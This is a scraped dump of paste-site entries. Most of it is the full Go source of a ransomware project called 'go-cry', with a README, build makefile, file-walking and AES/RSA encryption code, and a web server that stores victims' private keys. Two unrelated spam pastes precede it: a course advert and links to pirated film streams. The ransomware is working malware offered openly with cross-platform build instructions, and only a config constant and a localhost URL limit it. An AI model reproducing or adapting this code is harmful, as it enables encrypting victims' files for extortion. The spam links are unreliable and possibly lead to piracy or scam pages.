id,title,username,language,date,content
5Z2TXfTK,Untitled,sissou123,Python,Sunday 17th of December 2023 09:22:54 AM CDT,"The Data Science Course: Complete Data Science Bootcamp 2023
Complete Data Science Training: Mathematics, Statistics, Python, Advanced Statistics in Python, Machine & Deep Learning
for more:https://dz-linkk.com/CJtUKw"
bqr57NKP,dbftnfn,gadungw71,PHP,Sunday 17th of December 2023 09:13:12 AM CDT,"https://groups.google.com/g/erterdgh/c/-2GZ0Pei4R4
https://groups.google.com/g/alt.windows-xp/c/Z0TdIAZGsgg
https://www.taskade.com/p/izle-nefes-yer-eksi-iki-full-filmler-online-hd-1080-p-01HHTZ7T39A1QFXXM80E0EW6X0
https://baskadia.com/post/1q82s
https://vk.com/@piscesarya-tum-film-nefes-yer-eksi-iki-izle-2023-turkce-dublaj-full-h
https://vk.com/@blogchinemax-nefes-yer-eksi-iki-filmi-full-izle-2023-bihter-1080p-turkce
https://vk.com/@mopieboxoffice-filmi-izle-nefes-yer-eksi-iki-2023-tam-surum-turkce-altyazl
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/Xc2D4C4XrhU
https://groups.google.com/g/comp.os.minix/c/nu4CTglDlsM
https://www.taskade.com/p/izle-filmleri-nefes-yer-eksi-iki-full-filmler-online-hd-1080-p-01HHV039QPA8EGRZYJKX330B3E
https://baskadia.com/post/1q8af
https://groups.google.com/g/alt.windows-xp/c/jDXWbrZ-rew
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/aVXOd_L2sqw
https://groups.google.com/g/comp.os.minix/c/MXtSfPWg_pI
https://www.taskade.com/p/tuem-film-oeluemlue-duenya-2-2023-tuerkce-dublaj-full-hd-izle-01HHV1RT1PA52MF0P5GCR37XAM
https://baskadia.com/post/1q8qs
https://vk.com/@chinahade-film-olumlu-dunya-2-2023-stream-turkce-dublaj-tum-film
https://vk.com/@watchstylleronline-izle-filmleri-olumlu-dunya-2-full-filmler-online-hd-1080p
https://groups.google.com/g/alt.windows-xp/c/_yq0QGv7iU4
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/yNpsxq4Fgtk
https://groups.google.com/g/comp.os.minix/c/q8ggqOxUnNE
https://vk.com/@optimummm-film-murat-gogebakan-kalbim-yaral-2023-stream-turkce-dublaj
https://vk.com/@filmchinemax-murat-gogebakan-kalbim-yaral-filmi-tam-surum-2023hd-turkce-d
https://vk.com/@674475936-murat-gogebakan-kalbim-yaral-2023-film-izle-turkce-dublaj-fu
https://baskadia.com/post/1qihs
https://groups.google.com/g/esdgfg/c/asJmV9kknZQ
https://groups.google.com/g/comp.os.linux.misc/c/rKoEy_ycyWk
https://groups.google.com/g/alt.windows-xp/c/SRNQ3B3YHWU"
iQ2ndYPY,README,FlyFar,Email,Sunday 17th of December 2023 09:05:43 AM CDT,"go-cry
some do not seem to understand that this is not even close to being complete, and manage to build a system that processes payments for this then you are probably able to write this on their own. I could say that this was a program that encrypts some of your files and stores it on a server and you would not bother

This project was written to show how easy it is to create extremely malicious code.

Ransomware is designed to take your most loved files hostage demanding large amounts of money to unlock them.

Clone of native-tear written in Go which is a clone of hidden-tear

Building
go-cry consists of two parts, a webserver and the client software. Output files will be placed in ./bin/

Built with linker flags -w -s to minimize file size. To further reduce the size of Go binaries, please see the UPX project

Building client and webserver
$ make
Will create the files

./bin/web[.exe]
./bin/cry[.exe]
Building clients for all common operating systems and architectures
$ make all
Will create the files

./bin/windows_amd64.exe
./bin/windows_x86.exe
./bin/linux_amd64
./bin/linux_x86
./bin/macos (amd64)
Cleaning
Will remove all files in the bin directory

$ make clean
Configuring
Web server
See web/web.go and modify the constant values. They are commented and straightforward.

Client
See config.go and modify the constant values.

If modifying the RSA key size variable Bits, please see EncryptedHeaderSize. RSA ciphertext length changes depending on key size used and it is not calculated at runtime.

This program does not:
Demand any money from the user. It simply encrypts the number of files specified in config.go constant ProcessMax and sends it to the server. Encrypt your files and store your encryption key on your server.
"
7tqQtU6E,web/web.go,FlyFar,Go,Sunday 17th of December 2023 09:04:33 AM CDT,"package main

import (
	""fmt""
	""log""
	""net/http""
)

const (
	// Address server listening address
	Address = "":1312""

	// UploadRoute key uploading path
	UploadRoute = ""/upload""

	// RetrievalRoute
	RetrievalRoute = ""/retrieve""
)

// Pair private key and computer id
type Pair struct {
	Id  string
	Key string
}

// Keys stored in memory
var Keys = []Pair{}

func main() {
	http.HandleFunc(UploadRoute, handleUpload)
	http.HandleFunc(RetrievalRoute, handleRetrieve)

	fmt.Println(""Listening on"", Address)
	log.Fatal(http.ListenAndServe(Address, nil))
}

func reject(w http.ResponseWriter, r *http.Request, reason string) {
	fmt.Println(""Rejecting "", r.RemoteAddr+"":"", reason)
	w.WriteHeader(http.StatusNotFound)
	fmt.Fprint(w, http.StatusText(http.StatusNotFound))
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	id := r.PostFormValue(""i"")
	key := r.PostFormValue(""k"")

	if r.Method != ""POST"" {
		reject(w, r, ""HTTP method is not POST, got ""+r.Method)
		return
	}

	if id == """" {
		reject(w, r, ""id parameter i not set or empty"")
		return
	}

	if key == """" {
		reject(w, r, ""key parameter k is not set or empty"")
	}

	for _, pair := range Keys {
		if pair.Id == id {
			reject(w, r, ""key already exists"")
			return
		}
	}

	pair := Pair{Id: id, Key: key}
	Keys = append(Keys, pair)
}

func handleRetrieve(w http.ResponseWriter, r *http.Request) {
	id := r.PostFormValue(""i"")

	if r.Method != ""POST"" {
		reject(w, r, ""HTTP method is not POST, got ""+r.Method)
		return
	}

	if id == """" {
		reject(w, r, ""id parameter i is not set"")
		return
	}

	for _, pair := range Keys {
		if pair.Id == id {
			fmt.Fprint(w, pair.Key)
			return
		}
	}

	reject(w, r, ""no key found for id ""+id)
}"
43VG7y45,comms.go,FlyFar,Go,Sunday 17th of December 2023 09:03:59 AM CDT,"package main

import (
	""crypto/rsa""
	""io""
	""net/http""
	""net/url""
)

// PostKey sends the private key to the remote serrver
func PostKey(priv *rsa.PrivateKey, id string) error {
	key := Stringify(priv)

	_, err := http.PostForm(UploadEndpoint, url.Values{
		""k"": {key},
		""i"": {id},
	})

	return err
}

func GetKey(id string) (*rsa.PrivateKey, error) {
	req, err := http.PostForm(RetrieveEndpoint, url.Values{
		""i"": {id},
	})

	if err != nil {
		return nil, err
	}

	key := make([]byte, req.ContentLength)

	io.ReadFull(req.Body, key)

	priv, err := DecodeKey(key)

	return priv, err
}"
2Zsbzzrd,comms_test.go,FlyFar,Go,Sunday 17th of December 2023 09:03:17 AM CDT,"package main

import (
	""fmt""
	""testing""
)

func TestComms(t *testing.T) {
	fmt.Println(""Generating key..."")

	priv := Generate()
	str := Stringify(priv)
	fmt.Println(str)

	fmt.Println(""Uploading..."")
	err := PostKey(priv)

	if err != nil {
		panic(err)
	}

	fmt.Println(""Key uploaded"")

	fmt.Println(""Retrieving key..."")
	priv, err = GetKey()

	if err != nil {
		panic(err)
	}

	fmt.Println(Stringify(priv))
}

func TestServer(t *testing.T) {
	fmt.Println(""Sending the same key twice..."")
	priv := Generate()
	PostKey(priv)
	PostKey(priv)
}"
T4KD9qpa,config.go,FlyFar,Go,Sunday 17th of December 2023 09:02:02 AM CDT,"package main

// Extensions to walk
var Extensions = [...]string{
	""txt"",
	""doc"",
	""docx"",
	""xls"",
	""xlsx"",
	""ppt"",
	""pptx"",
	""odt"",
	""jpg"",
	""png"",
	""csv"",
	""sql"",
	""mdb"",
	""sln"",
	""php"",
	""asp"",
	""aspx"",
	""html"",
	""xml"",
	""psd"",
}

// IgnoreDirs will skip directories that contains the string
var IgnoreDirs = [...]string{
	""AppData"",
	""."",
}

const (
	// LockedExtension to append to file name when encrypted
	LockedExtension = "".locked""

	// ProcessMax X files, then stop
	ProcessMax int = 1

	// KeySize in bytes (AES-256)
	KeySize int = 32

	// Bits Keypair bit size (higher = exponentially slower)
	Bits int = 1024

	// EncryptedHeaderSize I don't know how to calculate the length of RSA ciphertext, but with KeySize + aes.BlockSize it'll be 128 bytes
	// Check this if changing AES keysize or RSA bit size
	EncryptedHeaderSize int = 128

	// Endpoint web server URL
	UploadEndpoint = ""http://localhost:1312/upload""

	RetrieveEndpoint = ""http://localhost:1312/retrieve""
)"
cNYLBPbi,crypto_test.go,FlyFar,Go,Sunday 17th of December 2023 09:01:33 AM CDT,"package main

import (
	""testing""
)

func TestCrypto(t *testing.T) {
	file := ""test.docx""
	priv := Generate()

	encrypt(file, priv)
	decrypt(file+LockedExtension, priv)
}"
Z90mdxUd,decrypt.go,FlyFar,Go,Sunday 17th of December 2023 09:00:54 AM CDT,"package main

import (
	""crypto/aes""
	""crypto/cipher""
	""crypto/rand""
	""crypto/rsa""
	""io/ioutil""

	""crypto/sha256""

	""strings""
)

func decrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	header := data[:EncryptedHeaderSize]
	label := []byte("""")

	header, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, header, label)

	if err != nil {
		panic(err)
	}

	key := header[:KeySize]
	iv := header[KeySize : KeySize+aes.BlockSize]

	data = data[EncryptedHeaderSize:]

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBDecrypter(block, iv)
	cipher.XORKeyStream(data, data)

	if strings.HasSuffix(file, LockedExtension) {
		file = file[:len(file)-len(LockedExtension)]
	}

	ioutil.WriteFile(file, data, 0777) // TODO
}"
htq32aQr,encrypt.go,FlyFar,Go,Sunday 17th of December 2023 09:00:24 AM CDT,"package main

import (
	""crypto/rsa""
	""io/ioutil""

	""crypto/aes""
	""crypto/rand""

	""crypto/cipher""

	""crypto/sha256""
)

func encrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	key := make([]byte, KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)
	pub := priv.PublicKey

	label := []byte("""")
	header, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, &pub, header, label)

	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBEncrypter(block, iv)
	cipher.XORKeyStream(data, data)

	data = append(header, data...)

	ioutil.WriteFile(file+LockedExtension, data, 0777)
}"
vW0VEibn,home_unix.go,FlyFar,Go,Sunday 17th of December 2023 08:59:58 AM CDT,"// +build !windows

package main

import (
	""os""
)

func GetHomeDir() string {
	return os.Getenv(""HOME"")
}"
JzUymvWV,home_windows.go,FlyFar,Go,Sunday 17th of December 2023 08:59:21 AM CDT,"package main

import (
	""os""
)

func GetHomeDir() string {
	home := os.Getenv(""HOMEDRIVE"") + os.Getenv(""HOMEPATH"")

	if home == """" {
		home = os.Getenv(""USERPROFILE"")
	}

	return home
}"
dqCSfJMw,keys.go,FlyFar,Go,Sunday 17th of December 2023 08:58:42 AM CDT,"package main

import (
	""crypto/rand""
	""crypto/rsa""
	""crypto/x509""
	""encoding/pem""
)

// Generate new RSA keypair
func Generate() *rsa.PrivateKey {
	priv, err := rsa.GenerateKey(rand.Reader, Bits)

	if err != nil {
		panic(err)
	}

	return priv
}

// Stringify private key
func Stringify(priv *rsa.PrivateKey) string {
	privateKeyDer := x509.MarshalPKCS1PrivateKey(priv)
	privateKeyBlock := pem.Block{
		Type:    ""RSA PRIVATE KEY"",
		Headers: nil,
		Bytes:   privateKeyDer,
	}

	return string(pem.EncodeToMemory(&privateKeyBlock))
}

// DecodeKey
func DecodeKey(key []byte) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(key))

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)

	return priv, err
}"
HrqeTwbz,main.go,FlyFar,Go,Sunday 17th of December 2023 08:58:04 AM CDT,"package main

import (
	""fmt""

	""crypto/rand""
	""crypto/rsa""
	""crypto/sha256""
	""encoding/hex""
	""io/ioutil""
	""os""
	""strings""
)

// GenerateID generates the unique identifier
func GenerateID() string {
	r := make([]byte, 32)
	rand.Read(r)

	hash := sha256.New()

	return hex.EncodeToString(hash.Sum(r))
}

func main() {
	idFile, err := os.Open(""id.txt"")

	var priv *rsa.PrivateKey

	shouldEncrypt := false

	// File exists, read id and get key from server
	if err == nil {
		idBytes, err := ioutil.ReadAll(idFile)
		idFile.Close()

		if err != nil {
			panic(err)
		}

		id := string(idBytes)
		id = strings.Split(id, ""\r\n"")[1]

		GetKey(id)
	} else {
		fmt.Println(""generating keypair..."")
		priv = Generate()
		shouldEncrypt = true
	}

	fmt.Println()
	fmt.Println(Stringify(priv))

	startWalk := GetHomeDir()

	Walk(startWalk, func(filePath string, fileInfo os.FileInfo, isEncrypted bool) {
		fmt.Println(filePath, ""encrypted"", isEncrypted)

		if shouldEncrypt && !isEncrypted {
			encrypt(filePath, priv)
		} else if isEncrypted {
			decrypt(filePath, priv)
		}
	})

	if shouldEncrypt {
		id := GenerateID()

		PostKey(priv, id)

		data := ""# Do not modify this file, it contains your ID matching the encryption key\r\n"" + id

		ioutil.WriteFile(""id.txt"", []byte(data), 0777)
	}
}"
nFfemXRN,makefile,FlyFar,Make,Sunday 17th of December 2023 08:57:20 AM CDT,"BUILD=go build -ldflags=""-w -s""

default: build

build:
	@echo ""Building cry...""
	$(BUILD) -o bin/cry.exe
	@echo ""Building server...""
	cd web/ && $(BUILD) -o ../bin/web.exe

clean:
	@rm -rf bin/
	@rm -f debug debug.test web/debug web/debug.test

all:
	GOOS=windows GOARCH=amd64 $(BUILD) -o bin/windows_amd64.exe
	GOOS=windows GOARCH=386 $(BUILD) -o bin/windows_x86.exe
	GOOS=linux GOARCH=amd64 $(BUILD) -o bin/linux_amd64
	GOOS=linux GOARCH=386 $(BUILD) -o bin/linux_x86
	GOOS=darwin GOARCH=amd64 $(BUILD) -o bin/macos"
d1X412Wd,walker.go,FlyFar,Go,Sunday 17th of December 2023 08:55:55 AM CDT,"package main

import (
	""fmt""
	""os""
	""path/filepath""
	""strings""
)

// Walk recursively walks the input directory and applies all rules (extensions, limits etc)
func Walk(startPath string, callback func(filePath string, fileInfo os.FileInfo, isEncrypted bool)) {
	var count int
	filepath.Walk(startPath, func(filePath string, fileInfo os.FileInfo, err error) error {
		if err != nil {
			fmt.Println(""error"", err.Error())
			return nil
		}

		var proceed bool
		for _, v := range Extensions {
			if strings.HasSuffix(filePath, v) || strings.HasSuffix(filePath, LockedExtension) {
				proceed = true
				break
			}
		}

		for _, v := range IgnoreDirs {
			if strings.Contains(filepath.Dir(filePath), v) {
				proceed = false
				break
			}
		}

		if proceed && count < ProcessMax {
			count++

			isEncrypted := strings.HasSuffix(filePath, LockedExtension)

			callback(filePath, fileInfo, isEncrypted)
		}

		return nil
	})
}"
